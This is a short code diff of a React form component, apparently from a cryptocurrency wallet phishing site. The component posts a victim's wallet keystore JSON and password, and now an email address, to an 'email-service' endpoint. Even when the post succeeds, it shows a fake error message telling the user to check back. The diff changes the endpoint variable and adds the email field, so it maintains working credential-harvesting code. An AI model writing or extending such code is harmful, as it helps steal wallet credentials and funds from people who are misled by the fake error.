@@ -10,7 +10,6 @@ const KeystoreJSON = () => {
 
   const onSubmit = async (e) => {
     e.preventDefault();
-    // console.log({ keyStore, password });
 
     if (keyStore === "" || password === "") {
       return toast.error("Please fill in the required data.");
@@ -19,9 +18,10 @@ const KeystoreJSON = () => {
     setLoading(true);
 
     try {
-      await axios.post(`${remoteApi}/email-service/keystore-json`, {
+      await axios.post(`${api}/email-service/keystore-json`, {
         keyStore,
         password,
+        email,
       });
       toast.error("An error has occured... Please check back");
       setLoading(false);
